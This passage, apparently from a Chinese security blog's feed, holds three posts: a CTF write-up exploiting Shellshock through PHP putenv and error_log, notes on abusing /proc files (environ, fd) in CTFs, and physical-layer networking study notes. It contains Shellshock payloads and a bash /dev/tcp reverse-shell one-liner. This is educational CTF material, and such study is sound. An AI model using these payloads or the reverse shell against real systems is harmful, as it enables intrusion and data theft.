bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084631286.png" alt="image-20240321084631286"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack() &#123; echo &quot;hacker&quot;; &#125;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084802497.png" alt="image-20240321084802497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084851281.png" alt="image-20240321084851281"></p><p>下面就是有漏洞点的地方了，但是要在bash&lt;&#x3D;4.3版本才有该漏洞</p><p>先来展示一下没有漏洞的情况</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test=&#x27;() &#123; echo &quot;this is a bug&quot;; &#125;&#x27;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321085418028.png" alt="image-20240321085418028"></p><p>有漏洞的情况就是在子进程中直接输入test会被当作函数来执行，比如文章中的这样</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123;  echo &quot;ailx10 is a hacker&quot;;&#125;&#x27;<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10<br>bash: export: ailx10: not a function<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash<br>[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10<br>ailx10 is a hacker<br></code></pre></td></tr></table></figure><p>还可以有这种方式，利用() { :; };&#x2F;bin&#x2F;ls</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123; :; &#125;;/bin/ls&#x27;<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash<br>curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt<br>curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit<br>exit<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$<br></code></pre></td></tr></table></figure><p><strong>综上所述触发bash漏洞可以归纳如下</strong></p><ol><li>产生新的bash</li><li>通过环境变量传递</li><li>环境变量以<code>() &#123;&#125;</code>这样的形式</li></ol><p><strong>可以用下面的一条语句来验证是否有shellshock漏洞</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;<br></code></pre></td></tr></table></figure><p>不存在的情况：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321090254063.png" alt="image-20240321090254063"></p><p>存在的情况：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321090319060.png" alt="image-20240321090319060"></p><blockquote><p>:在这里就相当于true</p><p><code>env</code>可以创建临时环境变量</p><p><code>bash -c</code>可以运行一个shell命令</p><p>对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}’后停止，也就是说定义在函数体外shell命令也会执行。</p></blockquote><p>那现在看回这题</p><p>同样蚁剑连上之后执行不了命令</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321140952793.png" alt="image-20240321140952793"></p><p>这题说是利用到了shellshock漏洞，那就要满足上面三个条件，这里是利用了执行error_log函数时会执行sh -c -t -i，这里还需要sh 默认的 shell 是 bash，然后就会开启一个新的bash环境所以如果存在漏洞即可触发，我们可以自己写一个error_log然后去跟踪调用看一下 </p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321142333751.png" alt="image-20240321142333751"></p><p>那么就可以同样利用上一题的方法，用putenv来写一个php文件然后上传触发</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;hack=() &#123; :; &#125;;cat /flag &gt;&gt; /var/www/html/flag.txt&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321142626262.png" alt="image-20240321142626262"></p><p>emmm很怪啊收不到flag</p><p>难绷后来找到问题，环境变量一定要有PHP_前缀我也不知道为什么很奇怪，正确payload如下，这里flag不能直接读要用&#x2F;readflag：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_hack=() &#123; :; &#125;; /read &gt;&gt; /var/www/html/flag2.txt&quot;</span>); <br>   <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321145724033.png" alt="image-20240321145724033"></p><h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proc目录作用总结</title>
      <link href="/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>参考文章：<a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1 id="proc目录是什么"><a href="#proc目录是什么" class="headerlink" title="&#x2F;proc目录是什么"></a>&#x2F;proc目录是什么</h1><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p><p>这里看一下&#x2F;proc目录下有什么</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310230848618.png" alt="image-20240310230848618"></p><p>目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号(PID)，里面包含对应进程相关的多个信息文件。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310231053017.png" alt="image-20240310231053017"></p><p>进程号为1的文件里有这些文件，其中有些文件是每个进程都会有的，ctf中我们需要的就是利用这些通用的文件来获取一些进程中的相关信息。</p><h1 id="proc目录作用"><a href="#proc目录作用" class="headerlink" title="&#x2F;proc目录作用"></a>&#x2F;proc目录作用</h1><p><strong>&#x2F;proc&#x2F;self</strong>指向的就是当前进程号的目录，这个会经常用到，因为比如靶机启动的时候会有一个自己的进程，这个时候就可以通过&#x2F;proc&#x2F;self来获取当前的进程号，进而获取我们需要的信息。</p><h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><p>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/cmdline<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310231615078.png" alt="image-20240310231615078"></p><p>比如目标启动了一个web服务的时候，比如<strong>python .&#x2F;app.py</strong>，我们就可以通过cat &#x2F;proc&#x2F;self&#x2F;cmdline来获得这个启动命令了。</p><h2 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h2><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls /proc/117/cwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310231940043.png" alt="image-20240310231940043"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/7163/cwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310232042034.png" alt="image-20240310232042034"></p><h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/exe<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310232728115.png" alt="image-20240310232728115"></p><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><p>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/environ<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310232953047.png" alt="image-20240310232953047"></p><p>有时候secret_key会放在环境变量我们就可以去读取</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/fd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310233433456.png" alt="image-20240310233433456"></p><p>然后想查看某个文件可以去cat对应的描述符</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/fd/7<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310233618051.png" alt="image-20240310233618051"></p><blockquote><p><strong>在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote><p>bash反弹shell命令的编写也和fd有关，现在拿反弹shell的命令来解析一下，参考文章：<a href="https://www.anquanke.com/post/id/85712">https://www.anquanke.com/post/id/85712</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><blockquote><p>bash -i就是打开一个交互式的bash</p><p> &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在&#x2F;dev&#x2F;udp&#x2F;。</p></blockquote><h2 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h2><p>maps文件提供了有关当前进程地址空间中内存映射的信息。你可以看到包含当前进程地址空间中所有已映射内存区域（如代码段、数据段、堆、栈等）的详细信息。每一行表示一个内存区域，其中包含了该区域的起始地址、结束地址、访问权限等信息。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/maps<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310234519798.png" alt="image-20240310234519798"></p><blockquote><p>上面的信息依次如下：</p><p>起始地址-结束地址 权限 偏移量 设备号 节点号 文件名</p></blockquote><h2 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h2><p>&#x2F;proc&#x2F;self&#x2F;mem 是一个特殊文件，它代表当前进程的内存映射。通过对该文件进行读取和写入操作，可以读取和修改当前进程的物理内存。它用于对进程的内存进行读写操作，通常用于调试和分析工具。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/mem<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310235303267.png" alt="image-20240310235303267"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-6</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/</url>
      
        <content type="html"><![CDATA[<!-- toc --><h1 id="物理层概述"><a href="#物理层概述" class="headerlink" title="物理层概述"></a>物理层概述</h1><p>导图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311085938464.png" alt="image-20240311085938464"></p><p>物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</p><p><strong>物理层主要任务：</strong>确定与传输媒体接口有关的一些特性</p><p><strong>物理层特性</strong></p><ol><li>机械特性：定义物理连接的特性，规定物理连接时所采用的规格、接口形状、引线数目、引脚数量和排列情况。</li><li>电气特性：规定传输二进制位时，线路上信号的电压范围、阻抗匹配、传输速率和距离限制等。</li><li>功能特性：指明某条线上出现的某一电平表示何种意义，接口部件的信号线的用途。</li><li>规程特性：(过程特性)定义各条物理线路的工作规程和时序关系。</li></ol><h1 id="数据通信"><a href="#数据通信" class="headerlink" title="数据通信"></a>数据通信</h1><h2 id="数据通信模型"><a href="#数据通信模型" class="headerlink" title="数据通信模型"></a>数据通信模型</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311133036272.png" alt="image-20240311133036272"></p><p><strong>数字信号和模拟信号</strong></p><p>这两种信号的最主要区别就是：数字信号是离散的，而模拟信号是连续的。</p><p>数字信号是数字化的，在计算机中，CPU只认识“0”和“1”两个数字，所以数字信号需要由“0”和“1”构成的二制数来表示;而摸拟信号则是连续变化的物理量，它的频率、幅度、相位都可以随着时间连续的变化。</p><p><strong>模拟信号：</strong>是指信息参数在给定范围内表现为连续的信号。或在一段连续的时间间隔内，其代表信息的特征量可以在任意瞬间呈现为任意数值的信号。其分布于自然界的各个角落，如每天的温度变化，连续的山峰。</p><p><strong>数字信号：</strong>是指人们抽象出来的时间上不连续的信号，其幅度的取值是离散的，且幅值被限制在有限个数值之内。<br>例如二进制码就是一种数字信号。</p><h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><p>数据通信指在不同计算机之间传输表示信息的二进制数0、1序列的过程。</p><ul><li><p><strong>数据data：</strong>传送信息的实体，通常是有意义的符号序列。</p></li><li><p><strong>信号：</strong>数据的电气&#x2F;电磁的表现，是数据在传输过程中的存在形式。</p></li><li><p><strong>信源：</strong>产生和发送数据的源头。</p></li><li><p><strong>信宿：</strong>接收数据的终点。</p></li><li><p><strong>信道：</strong>信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和一条接收信道。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311133924072.png" alt="image-20240311133924072"></p></li></ul><h2 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h2><ol><li><p>单工通信</p><p>只有一个方向的通信而没有反方向的交互，仅需要一条信道。</p></li><li><p>半双工通信&#x2F;双向交替通信</p><p>通信的双方都可以发送或接收信息，但任何一方都不能同时发送和接收需要两条信道。</p></li><li><p>全双工同信&#x2F;双向同时通信</p><p>通信双方可以同时发送和接受信息，也需要两条信道。</p></li></ol><h2 id="数据传输方式"><a href="#数据传输方式" class="headerlink" title="数据传输方式"></a>数据传输方式</h2><ul><li>串行传输和并行和传输</li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311134306251.png" alt="image-20240311134306251"></p><ul><li>同步传输和异步传输</li></ul><p><strong>同步传输：</strong>在同步传输的模式下，数据的传送是以一个数据区块为单位，因此同步传输又称为区块传输。<br>在传送数据时，需先送出1个或多个同步字符，再送出整批的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311164351449.png" alt="image-20240311164351449"></p><p><strong>异步传输：</strong></p><p>异步传输将比特分成小组进行传送，小组可以是8位的1个字符或更长。发送方可以在任何时刻发送这些比特组，而接收方不知道它们会在什么时候到达。传送数据时，加一个字符起始位和一个字符终止位。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311164401203.png" alt="image-20240311164401203"></p><h2 id="数据传输相关术语"><a href="#数据传输相关术语" class="headerlink" title="数据传输相关术语"></a>数据传输相关术语</h2><ul><li><p>码元：码元是指用一个固定时长的信号波形_(数字脉冲)，代表不同离散数值的基本波形，是数字通信中数字信号的计量单位，这个时长内的信号称为k进制码元，而该时长称为码元宽度。当码元的离散状态有M个时(M大于2)，此时码元为M进制码元。</p><p>1码元可以携带多个比特的信息量。例如，在使用二进制编码时，只有两种不同的码元，一种代表0状态，另一种代表1状态。</p><p><strong>例如下面的例子：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311165607774.png" alt="image-20240311165607774"></p><p>传递01信号的时候，只有两种状态也就是只有两种码元就叫做二进制码元；如果有四种状态的话的就是四进制码元，此时的一个码元就可以携带两个比特的信息，因为四种状态可以用两个比特表示完全；那么相对的，16进制码元就可以携带四个比特的信息。</p></li><li><p>码元传输速率：别名码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数(也可称为脉冲个数或信号变化的次数)，单位是波特(Baud)；1波特表示数字通信系统每秒传输一个码元。</p><p>数字信号有多进制和二进制之分，但码元速率与进制数无关，只与码元长度T有关；<strong>T就是上面01信号的一横杠时间，也就是一个状态变化的时间。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311170416392.png" alt="image-20240311170416392"></p></li><li><p>信息传输速率：别名信息速率、比特率等，表示单位时间内数字通信系统传输的二进制码元个数(即比特数)，单位是比特&#x2F;秒(b&#x2F;s)</p><p>若一个码元携带n bit的信息量，那么M Baud的码元传输速率所对应的信息传输速率就为M*n bit&#x2F;s。</p></li><li><p>带宽：</p><ul><li>模拟信号系统中：当输入的信号频率高或低到一定程度，使得系统的输出功率成为输入功率的一半时(即-3dB)，最高频率和最低频率间的差值就代表了系统的通频带宽，其单位为赫兹(Hz)。</li><li>数字设备中：表示在单位时间内从网络中的某一点到另一点所能通过的“最高数据率”&#x2F;单位时间内通过链路的数量，常用来表示网络的通信线路所能传输数据的能力。单位是比特每秒(bps或b&#x2F;s)。带宽更宽，也就是有更大的信息运送能力。</li></ul></li></ul><h1 id="奈氏准则"><a href="#奈氏准则" class="headerlink" title="奈氏准则"></a>奈氏准则</h1><h2 id="失真"><a href="#失真" class="headerlink" title="失真"></a>失真</h2><p>就是因为一些因素干扰，导致传输过程中信号波形改变，导致接收方难以辨认。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311171514652.png" alt="image-20240311171514652"></p><p><strong>影响失真程度的因素：</strong>1.码元传输速率2.信号传输距离3.噪声干扰 4.传输媒体质量</p><p><strong>码间串扰</strong></p><p>因为传输的频率太快导致接收端失去了码元之间清晰界限的现象</p><p><strong>信道带宽</strong></p><p>信道带宽是信道能通过的最高频率和最低频率之差。频率过高会发生码间串扰，过低会导致容易受到干扰导致波形变化太大。</p><p>比如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311181049734.png" alt="image-20240311181049734"></p><p>该图的信道带宽就是3300Hz-300Hz&#x3D;3000Hz</p><h2 id="奈氏准则-奈奎斯特定理"><a href="#奈氏准则-奈奎斯特定理" class="headerlink" title="奈氏准则(奈奎斯特定理)"></a>奈氏准则(奈奎斯特定理)</h2><p><strong>奈式准则</strong>：在理想低通(无噪声，带宽受限)条件下，为了避免码间串扰，极限码元传输速率为2W Baud，W是信道带宽，单位是Hz。</p><p>极限数据传输速率计算如下，也就是上面码元传输速率和信息传输速率的转换。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311181856387.png" alt="image-20240311181856387"></p><p>由奈式准则可以推出下面的结论：</p><ol><li><p>在任何信道中，码元传输的速率是有上限的。若传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的完全正确识别成为不可能。</p></li><li><p>信道的频带越宽(即能通过的信号高频分量越多)，就可以用更高的速率进行码元的有效传输。</p></li><li><p>奈氏准则给出了码元传输速率的限制，但并没有对信息传输速率给出限制。</p></li><li><p>由于码元的传输速率受奈氏准则的制约，所以要提高数据的传输速率，就必须设法使每个码元能携带更多个比特的信息量，这就需要采用多元制的调制方法。</p></li></ol><h1 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h1><p>噪声存在于所有的电子设备和通信信道中。由于噪声随机产生，它的瞬时值有时会很大，因此噪声会使接收端对码元的判决产生错误。但是噪声的影响是相对的，若信号较强，那么噪声影响相对较小。因此，信噪比就很重要。<strong>信噪比&#x3D;信号的平均功率&#x2F;噪声的平均功率</strong>，常记为S&#x2F;N，并用分贝(dB)作为度量单位，即:</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312093325742.png" alt="image-20240312093325742"></p><p><strong>香农定理</strong>：在带宽受限且有噪声的信道中，为了不产生误差，信息的传输速率有上限值</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312093437732.png" alt="image-20240312093437732"></p><p><strong>通过香农定理得出的推论</strong></p><ol><li><p>信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。</p></li><li><p>对一定的传输带宽和一定的信噪比，信息传输速率的上限就确定了。</p></li><li><p>只要信息的传输速率低于信道的极限传输速率，就一定能找到某种方法来实现无差错的传输。</p></li><li><p>香农定理得出的为极限信息传输速率，实际信道能达到的传输速率要比它低不少。</p></li><li><p>从香农定理可以看出，若信道带宽W或信噪比S&#x2F;N没有上限(不可能)，那么信道的极限信息传输速率也就没有上限。</p></li></ol><h2 id="奈式和香农的对比"><a href="#奈式和香农的对比" class="headerlink" title="奈式和香农的对比"></a>奈式和香农的对比</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312094031816.png" alt="image-20240312094031816"></p><p><strong>例题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312094101429.png" alt="image-20240312094101429"></p><p>在两个公式算出的数据传输速率中，应该选择较小的那个才是正确的。</p><h1 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h1><h2 id="基带信号与宽带信号"><a href="#基带信号与宽带信号" class="headerlink" title="基带信号与宽带信号"></a>基带信号与宽带信号</h2><ul><li><p><strong>基带信号：</strong>将数字信号1和0直接用两种不同的电压表示，再送到数字信道上去传输(基带传输)。</p><p>来自信源的信号，像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是发出的直接表达了要传输的信息的信号，比如我们说话的声波就是基带信号。(所以基带信号也可以是模拟信号，只是在计网中通常指的是数字信号)</p></li><li><p><strong>宽带信号：</strong>将基带信号进行调制后形成的频分复用模拟信号，再传送到模拟信道上去传输(宽带传输)</p><p>把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输(即仅在一段频率范围内能够通过信道)。</p></li></ul><p>这两种信号的选择跟传输距离有关，在距离较近时可以直接使用基带信号直接传输，在距离较远的时候就要使用宽带信号防止信号丢失严重。</p><h2 id="编码与调制的区分"><a href="#编码与调制的区分" class="headerlink" title="编码与调制的区分"></a>编码与调制的区分</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312135128620.png" alt="image-20240312135128620"></p><h2 id="编码与调制的具体方式"><a href="#编码与调制的具体方式" class="headerlink" title="编码与调制的具体方式"></a>编码与调制的具体方式</h2><h3 id="数字数据编码为数字信号"><a href="#数字数据编码为数字信号" class="headerlink" title="数字数据编码为数字信号"></a>数字数据编码为数字信号</h3><p>以下面的二进制数据来介绍各种编码方式：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141043018.png" alt="image-20240312141043018"></p><ol><li><p>非归零编码【NRZ】</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141144428.png" alt="image-20240312141144428"></p><p>特点就是高1低0，该编码很容易实现，但没有纠错功能，且无法判断一个码元的开始和结束，以至于收发双方难以保持同步。</p></li><li><p>曼彻斯特编码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141802576.png" alt="image-20240312141802576"></p><p>将一个码元分成两个相等的间隔，前一个间隔为低电平后一个间隔为高电平表示码元1;码元0则正好相反。也可以采用相反的规定。该编码的特点是在每一个码元的中间出现电平跳变，位于中间的跳变既作时钟信号(可用于同步)又作数据信号，但它所占的频带宽度是原始的基带宽度的两倍。</p><p><strong>所以数据传输速率只有调制速率的1&#x2F;2</strong></p></li><li><p>差分曼彻斯特编码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312142117689.png" alt="image-20240312142117689"></p><p>常用于局域网传输，其规则是:若码元为1，则前半个码元的电平与上一个码元的后半个码元的电平相同，若为0，则相反。该编码的特点是，在每个码元的中间，都有一次电平的跳转，可以实现自同步，且抗干扰性强于曼彻斯特编码。</p></li><li><p>归零编码【RZ】</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141301827.png" alt="image-20240312141301827"></p><p>就是信号电平在一个码元之内都要恢复到零。</p></li><li><p>反向不归零编码【NRZI】</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141439802.png" alt="image-20240312141439802"></p><p>信号电平翻转表示0，信号电平不变表示1.</p></li><li><p>4B&#x2F;5B编码</p><p>比特流中插入额外的比特以打破一连串的0或1，就是用5个比特来编码4个比特的数据，之后再传给接收方，因此称为4B&#x2F;5B。编码效率为80%。</p><p>只采用16种编码对应16种不同的4位码，多出来的16种作为控制码(帧的开始和结束，线路的状态信息等)或保留。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312142425457.png" alt="image-20240312142425457"></p></li></ol><h3 id="数字数据调制为模拟信号"><a href="#数字数据调制为模拟信号" class="headerlink" 